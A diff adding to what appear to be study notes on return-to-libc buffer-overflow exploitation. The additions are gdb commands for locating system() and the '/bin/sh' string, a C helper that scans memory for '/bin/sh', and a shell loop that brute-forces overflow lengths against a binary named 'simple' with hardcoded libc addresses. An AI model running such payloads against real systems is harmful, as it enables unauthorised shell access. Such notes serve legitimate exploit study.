@@ -57,6 +57,32 @@ gcc -m32
 * r
 * print system
 * find "/bin/sh" all
+* x/s *((char **)environ)
+
+* break main
+* clear
+
+````
+// gcc -m32 -std=c99 tst.c
+//
+
+#include <stdio.h>
+#include <string.h>
+
+int main(void)
+{
+    char s[] = "/bin/sh";
+    char *p = (char *) 0xbffff000;
+
+    // Get system addr from gdb
+    p = (char *)0xf7e0c980;
+
+    while (memcmp(++p, s, sizeof s));
+
+    printf("%s\n", p);
+    printf("%p\n", p);
+}
+````
 
 
 </br>
@@ -188,6 +214,8 @@ os.environ['VAR']=buffer
 os.execve(progname, [progname], os.environ)
 
 ````
+for i in `seq 60 99`; do ./simple  $(python -c "print 'A'*$i+'\x80\xc9\xe0\xf7'+'\xb0\xf9\xdf\xf7'+'\xaa\xca\xf4\xf7';"); done
+
 
 </br>
 
